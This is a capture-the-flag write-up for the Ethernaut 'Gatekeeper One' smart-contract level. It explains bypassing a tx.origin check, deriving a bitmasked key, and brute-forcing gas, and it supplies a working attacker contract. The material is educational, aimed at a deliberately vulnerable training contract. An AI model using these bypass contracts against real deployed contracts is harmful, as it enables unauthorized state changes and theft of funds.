# Gatekeeper One

Make it past the gatekeeper and register as an entrant to pass this level.
Things that might help:
* Remember what you've learned from the Telephone and Token levels.
* You can learn more about the msg.gas special variable, or its preferred alias gasleft(), in Solidity's documentation.
```javascript
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

---

In this challenge, we need to bypass those modifier.

`gateOne` chould be easily bypassed with technical we learned in `Telephone`.

`gateThree` chould be easily resolved with replace last 3rd, 4th bytes with `00`, that will make following result (for example):

| Parameter | Result |
| -------- | -------- | 
|bytes8(tx.origin)|`0x8dfe2f44e8fa733c`|
|bytes8(uint16(tx.origin)) | `0x000000000000733c` |
|bytes8(uint32(tx.origin))| `0x00000000e8fa733c` |
|bytes8(uint32(bytes8(tx.origin) & 0xFFFFFFFF0000FFFF))| `0x000000000000733c` |

Then `uint32(_gateKey) == uint16(_gateKey)`.

| Parameter | Result |
| -------- | -------- | 
|bytes8(uint32(bytes8(tx.origin) & 0xFFFFFFFF0000FFFF))| `0x000000000000733c` |
|bytes8(uint64(tx.origin))|`0x8dfe2f44e8fa733c`|
|bytes8(uint64(uint16(tx.origin)))|`0x000000000000733c`|
|bytes8(uint64(bytes8(tx.origin) & 0xFFFFFFFF0000FFFF))|`0x8dfe2f440000733c`|

Then `uint32(_gateKey) != uint64(_gateKey)`.

| Parameter | Result |
| -------- | -------- | 
|bytes8(uint32(bytes8(tx.origin) & 0xFFFFFFFF0000FFFF))| `0x000000000000733c` |
|bytes8(uint16(tx.origin)) | `0x000000000000733c` |

Then `uint32(_gateKey) == uint16(tx.origin)`.

Use `(bytes4(keccak256("enter(bytes8)"))` to call target function, which also easy for us to control how many exactly gas we used.
```javascript
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GateOneSkipper {
    bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function Skipper(address _param, uint16 gas) public returns(bool){
        //GatekeeperOne target = GatekeeperOne(_param);
        if(address(_param).call.gas(gas)(bytes4(keccak256("enter(bytes8)")), _gateKey)){
            return true;
        } else {
            return false;
        }
        
    }
}
```

In local VM environment, we use `GateOneSkipper` to call `GateKeeperOne` with `41123` gas for testing.

![](https://i.imgur.com/D0gWE5j.png)

In debugger, some writeups said that call `msg.gas` might be the last gas number.

But it's totally wrong cuz to `GAS2` action also costs gas, but in current 274 line, contract still not pay for it.

We should move to next EVM opcode to check the remaining, `40955`.

![](https://i.imgur.com/CLpFrlQ.png)

![](https://i.imgur.com/rwc6HNw.png)

However, it still failed on ropsten to challenge.

Due to `gas` will not be always static on block, the proper gas offset to use will vary depending on the compiler version and optimization settings used to deploy the factory contract.

I find a suggustion [here](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/attacks/GatekeeperOneAttack.sol), to give it a range then BrutalForce it out the answer.

```javascript
pragma solidity ^0.4.18;

contract GateOneSkipper {
    bytes8 _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    function Skipper(address _param) public returns(bool){
        // gas offset usually comes in around 210, give a buffer of 60 on each side
        for (uint256 i = 0; i < 120; i++) {
            if (address(_param).call.gas(i + 150 + 8191 * 3)(bytes4(keccak256("enter(bytes8)")), _gateKey)) {
                return true;
            }
        }
    }
}
```

Then check if address `entrant` changed?

```javascript
await contract.entrant()
```